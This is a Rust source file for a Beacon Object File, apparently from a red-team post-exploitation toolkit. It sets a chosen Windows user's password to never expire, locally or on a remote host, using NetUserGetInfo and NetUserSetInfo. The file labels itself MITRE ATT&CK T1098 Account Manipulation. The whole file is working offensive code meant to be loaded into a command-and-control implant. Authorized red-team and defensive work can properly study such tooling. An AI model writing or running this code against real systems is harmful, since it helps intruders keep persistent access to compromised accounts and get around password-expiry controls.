//! # Unexpire User BOF
//!
//! Sets a user account password to never expire by setting
//! the UF_DONT_EXPIRE_PASSWD flag via NetUserGetInfo (level 1)
//! and NetUserSetInfo (level 1008).
//!
//! ## MITRE ATT&CK
//! - T1098 - Account Manipulation
//!
//! ## Arguments
//! - `str`: Hostname (empty for localhost).
//! - `str`: Username whose password should never expire.
//!

#![no_std]

use alloc::string::String;
use rustbof::data::DataParser;
use rustbof::str::to_wide;
use rustbof::{eprintln, println};

const UF_DONT_EXPIRE_PASSWD: u32 = 0x10000;

#[repr(C)]
struct UserInfo1 {
    usri1_name: *mut u16,
    usri1_password: *mut u16,
    usri1_password_age: u32,
    usri1_priv: u32,
    usri1_home_dir: *mut u16,
    usri1_comment: *mut u16,
    usri1_flags: u32,
    usri1_script_path: *mut u16,
}

#[repr(C)]
struct UserInfo1008 {
    usri1008_flags: u32,
}

unsafe extern "system" {
    fn NetUserGetInfo(
        servername: *const u16,
        username: *const u16,
        level: u32,
        bufptr: *mut *mut u8,
    ) -> u32;
    fn NetUserSetInfo(
        servername: *const u16,
        username: *const u16,
        level: u32,
        buf: *const u8,
        parm_err: *mut u32,
    ) -> u32;
    fn NetApiBufferFree(buffer: *mut core::ffi::c_void) -> u32;
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let hostname = String::from(parser.get_str());
    let username = String::from(parser.get_str());

    let server_wide = if hostname.is_empty() {
        None
    } else {
        Some(to_wide(&hostname))
    };
    let user_wide = to_wide(&username);

    let server_ptr = server_wide
        .as_ref()
        .map_or(core::ptr::null(), |w| w.as_ptr());

    println!(
        "Setting password to never expire for user '{}' on '{}'...",
        username,
        if hostname.is_empty() { "localhost" } else { &hostname }
    );

    let mut buf: *mut u8 = core::ptr::null_mut();
    let status = unsafe {
        NetUserGetInfo(server_ptr, user_wide.as_ptr(), 1, &mut buf)
    };

    if status != 0 {
        eprintln!("NetUserGetInfo failed: {}", status);
        return;
    }

    let info = buf as *const UserInfo1;
    let current_flags = unsafe { (*info).usri1_flags };
    unsafe { NetApiBufferFree(buf as *mut core::ffi::c_void) };

    let new_flags = current_flags | UF_DONT_EXPIRE_PASSWD;

    let set_info = UserInfo1008 {
        usri1008_flags: new_flags,
    };

    let mut parm_err: u32 = 0;
    let status = unsafe {
        NetUserSetInfo(
            server_ptr,
            user_wide.as_ptr(),
            1008,
            &set_info as *const _ as *const u8,
            &mut parm_err,
        )
    };

    if status == 0 {
        println!("SUCCESS: Password for '{}' set to never expire.", username);
    } else {
        eprintln!("NetUserSetInfo failed: {} (parm_err: {})", status, parm_err);
    }
}
